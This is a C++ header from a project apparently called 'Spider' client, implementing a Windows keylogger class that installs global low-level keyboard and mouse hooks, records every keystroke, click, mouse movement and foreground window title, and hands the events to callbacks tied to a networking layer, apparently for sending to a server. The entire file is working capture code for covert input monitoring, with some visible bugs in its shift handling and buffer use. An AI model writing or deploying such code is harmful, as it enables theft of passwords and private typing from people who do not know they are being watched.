//
// Created by roman sztergbaum on 27/09/2017.
//

#ifndef SPIDER_CLIENT_WINKEYLOGGER_HPP
#define SPIDER_CLIENT_WINKEYLOGGER_HPP

#include <WindowsX.h>
#include <memory>
#include <utility>
#include <mutex>
#include <boost/bind.hpp>
#include <boost/circular_buffer.hpp>
#include <boost/variant.hpp>
#include <config/Config.hpp>
#include <Network/IOManager.hpp>
#include <Protocol/Messages.hpp>
#include <Keylogger/KeyLogger.hpp>

namespace spi
{
    class WinKeyLogger : public KeyLogger
    {
    public:
        explicit WinKeyLogger(net::IOManager *service) :
            _service(service), _circularBuffer(10)
        {
            _sharedInstance = this;
        }

        ~WinKeyLogger() override = default;

        bool setup() noexcept override
        {
            _thread = new std::thread{([this]() {
                setupHooks();
                while (_threadLoop && GetMessage(nullptr, nullptr, 0, 0));
                removeHooks();
            })};
            return true;
        }

        static LRESULT CALLBACK MouseHookProc(int code, WPARAM wParam, LPARAM lParam) noexcept
        {
            sharedInstance()->MouseHook(code, wParam, lParam);
            return CallNextHookEx(nullptr, code, wParam, lParam);
        }

        void MouseHook(int nCode, WPARAM wParam, LPARAM lParam) noexcept
        {
            if (nCode != HC_ACTION) {
                return;
            }
            switch (wParam) {
                case WM_MOUSEMOVE: {
                    proto::MouseMove mouseMove;

                    mouseMove.x = GET_X_LPARAM(lParam);
                    mouseMove.y = GET_Y_LPARAM(lParam);
                    mouseMove.timestamp = std::chrono::steady_clock::now();

                    std::lock_guard<std::mutex> lock_guard(_bufferMutex);
                    _circularBuffer.push_back({mouseMove});
                }
                    break;
                case WM_MBUTTONDOWN:
                case WM_RBUTTONDOWN:
                case WM_LBUTTONDOWN:
                case WM_LBUTTONUP:
                case WM_RBUTTONUP:
                case WM_MBUTTONUP: {
                    proto::MouseClick mouseClick;

                    mouseClick.x = GET_X_LPARAM(lParam);
                    mouseClick.y = GET_Y_LPARAM(lParam);
                    mouseClick.timestamp = std::chrono::steady_clock::now();
                    switch (wParam) {
                        case WM_MBUTTONUP:
                        case WM_LBUTTONUP:
                        case WM_RBUTTONUP:
                            mouseClick.state = proto::KeyState::Up;
                            break;

                        case WM_RBUTTONDOWN:
                        case WM_LBUTTONDOWN:
                        case WM_MBUTTONDOWN:
                            mouseClick.state = proto::KeyState::Down;
                            break;
                    }
                    switch (wParam) {
                        case WM_MBUTTONDOWN:
                        case WM_MBUTTONUP:
                            mouseClick.button = proto::MouseButton::Middle;
                            break;
                        case WM_RBUTTONUP:
                        case WM_RBUTTONDOWN:
                            mouseClick.button = proto::MouseButton::Right;
                            break;
                        case WM_LBUTTONUP:
                        case WM_LBUTTONDOWN:
                            mouseClick.button = proto::MouseButton::Left;
                            break;
                    }

                    std::lock_guard<std::mutex> lock_guard(_bufferMutex);
                    _circularBuffer.push_back({mouseClick});
                }
                    break;
            }
        }

        void KeyboardHook(int nCode, WPARAM wParam, LPARAM lParam) noexcept
        {
            if (nCode != HC_ACTION) {
                return;
            }

            static const std::unordered_map<DWORD, proto::KeyCode> notShifted = {
                {'A',        proto::KeyCode::a},
                {'Z',        proto::KeyCode::z},
                {'E',        proto::KeyCode::e},
                {'R',        proto::KeyCode::r},
                {'T',        proto::KeyCode::t},
                {'Y',        proto::KeyCode::y},
                {'U',        proto::KeyCode::u},
                {'I',        proto::KeyCode::i},
                {'O',        proto::KeyCode::o},
                {'P',        proto::KeyCode::p},
                {'Q',        proto::KeyCode::q},
                {'S',        proto::KeyCode::s},
                {'D',        proto::KeyCode::d},
                {'F',        proto::KeyCode::f},
                {'G',        proto::KeyCode::g},
                {'H',        proto::KeyCode::h},
                {'J',        proto::KeyCode::j},
                {'K',        proto::KeyCode::k},
                {'L',        proto::KeyCode::l},
                {'M',        proto::KeyCode::m},
                {'W',        proto::KeyCode::w},
                {'X',        proto::KeyCode::x},
                {'C',        proto::KeyCode::c},
                {'V',        proto::KeyCode::v},
                {'B',        proto::KeyCode::b},
                {'N',        proto::KeyCode::n},
                {'0',        proto::KeyCode::GraveA},
                {'1',        proto::KeyCode::Ampersand},
                {'2',        proto::KeyCode::AcuteE},
                {'3',        proto::KeyCode::DoubleQuote},
                {'4',        proto::KeyCode::Quote},
                {'5',        proto::KeyCode::OpeningParenthesis},
                {'6',        proto::KeyCode::Dash},
                {'7',        proto::KeyCode::GraveE},
                {'8',        proto::KeyCode::Underscore},
                {'9',        proto::KeyCode::CedillaC},
                {VK_F1,      proto::KeyCode::F1},
                {VK_F2,      proto::KeyCode::F2},
                {VK_F3,      proto::KeyCode::F3},
                {VK_F4,      proto::KeyCode::F4},
                {VK_F5,      proto::KeyCode::F5},
                {VK_F6,      proto::KeyCode::F6},
                {VK_F7,      proto::KeyCode::F7},
                {VK_F8,      proto::KeyCode::F8},
                {VK_F9,      proto::KeyCode::F9},
                {VK_F10,     proto::KeyCode::F10},
                {VK_F11,     proto::KeyCode::F11},
                {VK_F12,     proto::KeyCode::F12},
                {VK_CAPITAL, proto::KeyCode::CapsLock},
                {VK_INSERT,  proto::KeyCode::Inser},
                {VK_DELETE,  proto::KeyCode::Delete},
                {VK_DELETE,  proto::KeyCode::Delete},
                {VK_BACK,    proto::KeyCode::Backspace},
                {VK_TAB,     proto::KeyCode::Tab},
                {VK_ESCAPE,  proto::KeyCode::Escape},
                {VK_SPACE,   proto::KeyCode::Space},
                {VK_RETURN,  proto::KeyCode::Enter},
                {VK_SHIFT,   proto::KeyCode::Shift},
                {VK_CONTROL, proto::KeyCode::Ctrl},
                {VK_MENU,    proto::KeyCode::Alt},
                {165,        proto::KeyCode::AltGr},
            };

            static const std::unordered_map<DWORD, proto::KeyCode> shifted = {
                {'A',        proto::KeyCode::A},
                {'Z',        proto::KeyCode::Z},
                {'E',        proto::KeyCode::E},
                {'R',        proto::KeyCode::R},
                {'T',        proto::KeyCode::T},
                {'Y',        proto::KeyCode::Y},
                {'U',        proto::KeyCode::U},
                {'I',        proto::KeyCode::I},
                {'O',        proto::KeyCode::O},
                {'P',        proto::KeyCode::P},
                {'Q',        proto::KeyCode::Q},
                {'S',        proto::KeyCode::S},
                {'D',        proto::KeyCode::D},
                {'F',        proto::KeyCode::F},
                {'G',        proto::KeyCode::G},
                {'H',        proto::KeyCode::H},
                {'J',        proto::KeyCode::J},
                {'K',        proto::KeyCode::K},
                {'L',        proto::KeyCode::L},
                {'M',        proto::KeyCode::M},
                {'W',        proto::KeyCode::W},
                {'X',        proto::KeyCode::X},
                {'C',        proto::KeyCode::C},
                {'V',        proto::KeyCode::V},
                {'B',        proto::KeyCode::B},
                {'N',        proto::KeyCode::N},
                {'0',        proto::KeyCode::_0},
                {'1',        proto::KeyCode::_1},
                {'2',        proto::KeyCode::_2},
                {'3',        proto::KeyCode::_3},
                {'4',        proto::KeyCode::_4},
                {'5',        proto::KeyCode::_5},
                {'6',        proto::KeyCode::_6},
                {'7',        proto::KeyCode::_7},
                {'8',        proto::KeyCode::_8},
                {'9',        proto::KeyCode::_9},
                {VK_F1,      proto::KeyCode::F1},
                {VK_F2,      proto::KeyCode::F2},
                {VK_F3,      proto::KeyCode::F3},
                {VK_F4,      proto::KeyCode::F4},
                {VK_F5,      proto::KeyCode::F5},
                {VK_F6,      proto::KeyCode::F6},
                {VK_F7,      proto::KeyCode::F7},
                {VK_F8,      proto::KeyCode::F8},
                {VK_F9,      proto::KeyCode::F9},
                {VK_F10,     proto::KeyCode::F10},
                {VK_F11,     proto::KeyCode::F11},
                {VK_F12,     proto::KeyCode::F12},
                {VK_CAPITAL, proto::KeyCode::CapsLock},
                {VK_INSERT,  proto::KeyCode::Inser},
                {VK_DELETE,  proto::KeyCode::Delete},
                {VK_DELETE,  proto::KeyCode::Delete},
                {VK_BACK,    proto::KeyCode::Backspace},
                {VK_TAB,     proto::KeyCode::Tab},
                {VK_ESCAPE,  proto::KeyCode::Escape},
                {VK_SPACE,   proto::KeyCode::Space},
                {VK_RETURN,  proto::KeyCode::Enter},
                {VK_SHIFT,   proto::KeyCode::Shift},
                {VK_LSHIFT,  proto::KeyCode::Shift},
                {VK_RSHIFT,  proto::KeyCode::Shift},
                {VK_CONTROL, proto::KeyCode::Ctrl},
                {VK_MENU,    proto::KeyCode::Alt},
                {165,        proto::KeyCode::AltGr},
            };

            std::string tmp{};

            tmp.reserve(256);
            HWND hwnd = GetForegroundWindow();
            GetWindowText(hwnd, tmp.data(), sizeof(char) * 256);
            if (tmp != _activeWindowTitle) {
                std::lock_guard<std::mutex> lock_guard(_bufferMutex);
                proto::WindowChanged windowChanged;

                windowChanged.windowName = tmp;
                _circularBuffer.push_back({windowChanged});
            }

            if (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN || wParam == WM_KEYUP || wParam == WM_SYSKEYUP) {
                auto p = (PKBDLLHOOKSTRUCT)lParam;

                DWORD code = p->vkCode;
                proto::KeyEvent keyEvent;
                keyEvent.state =
                    wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN ? proto::KeyState::Down : proto::KeyState::Up;

                keyEvent.timestamp = std::chrono::steady_clock::now();
                if (_activeKeys[proto::KeyCode::Shift] == proto::KeyState::Up) {
                    if (shifted.find(code) != shifted.end()) {
                        keyEvent.code = shifted.at(code);
                    }
                } else if (_activeKeys[proto::KeyCode::Shift] == proto::KeyState::Down) {
                    if (shifted.find(code) != shifted.end()) {
                        if (shifted.at(code) == proto::KeyCode::Shift) {
                            keyEvent.code = shifted.at(code);
                        }
                    }
                } else {
                    _log(logging::Warning) << "Unhandled KeyEvent {" << code << "}" << std::endl;
                    return;
                }

                std::lock_guard<std::mutex> lock_guard(_bufferMutex);
                _circularBuffer.push_back({keyEvent});
            }
        }

        static LRESULT CALLBACK KeyboardHookProc(int code, WPARAM wParam, LPARAM lParam) noexcept
        {
            sharedInstance()->KeyboardHook(code, wParam, lParam);
            return CallNextHookEx(nullptr, code, wParam, lParam);
        }

        void setupHooks() noexcept
        {
            _mouseHook = SetWindowsHookEx(WH_MOUSE_LL, &MouseHookProc, nullptr, 0);
            _keyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, &KeyboardHookProc, nullptr, 0);
            _log(logging::Info) << "[HOOKS] Successfully settled" << std::endl;
        }

        void removeHooks() noexcept
        {
            UnhookWindowsHookEx(_keyboardHook);
            UnhookWindowsHookEx(_mouseHook);
            _log(logging::Info) << "[HOOKS] Successfully removed" << std::endl;
        }

        void threadFunction() noexcept
        {
            std::lock_guard<std::mutex> _lock_guard(_bufferMutex);

            while (!_circularBuffer.empty()) {

                Events &tmp = _circularBuffer.front();
                _circularBuffer.pop_front();
                switch (tmp.which()) {
                    case 0:
                        _mouseClickCallback(std::move(boost::get<proto::MouseClick>(tmp)));
                        break;
                    case 1:
                        _keyPressCallback(std::move(boost::get<proto::KeyEvent>(tmp)));
                        break;
                    case 2:
                        _mouseMoveCallback(std::move(boost::get<proto::MouseMove>(tmp)));
                        break;
                    case 3:
                        _windowChangeCallback(std::move(boost::get<proto::WindowChanged>(tmp)));
                        break;
                }
            }
            _service->get().post(boost::bind(&WinKeyLogger::threadFunction, this));
        }

        void run() override
        {
            _log(logging::Info) << "Running..." << std::endl;
            _service->get().post(boost::bind(&WinKeyLogger::threadFunction, this));
        }

        void stop() override
        {
            _threadLoop = false;
            if (_thread->joinable()) {
                _thread->join();
            }
            delete _thread;
            // KILL THREAD
        }

    private:
        net::IOManager *_service;
        HHOOK _keyboardHook{};
        HHOOK _mouseHook{};

        using Events = boost::variant<proto::MouseClick, proto::KeyEvent, proto::MouseMove, proto::WindowChanged>;
        boost::circular_buffer<Events> _circularBuffer;
        std::mutex _bufferMutex;

        std::atomic<bool> _threadLoop{true};
        std::thread *_thread;

        std::string _activeWindowTitle{};
        std::unordered_map<proto::KeyCode::EnumType, proto::KeyState> _activeKeys{};

        static WinKeyLogger *_sharedInstance;

    public:

        static WinKeyLogger *sharedInstance() noexcept
        {
            return _sharedInstance;
        }
    };

    WinKeyLogger *WinKeyLogger::_sharedInstance = nullptr;
}

namespace spi::details
{
    static always_inline KeyLogPtr createKeyLogger(net::IOManager &service)
    {
        return std::make_unique<WinKeyLogger>(&service);
    }
}

#endif //SPIDER_CLIENT_WINKEYLOGGER_HPP
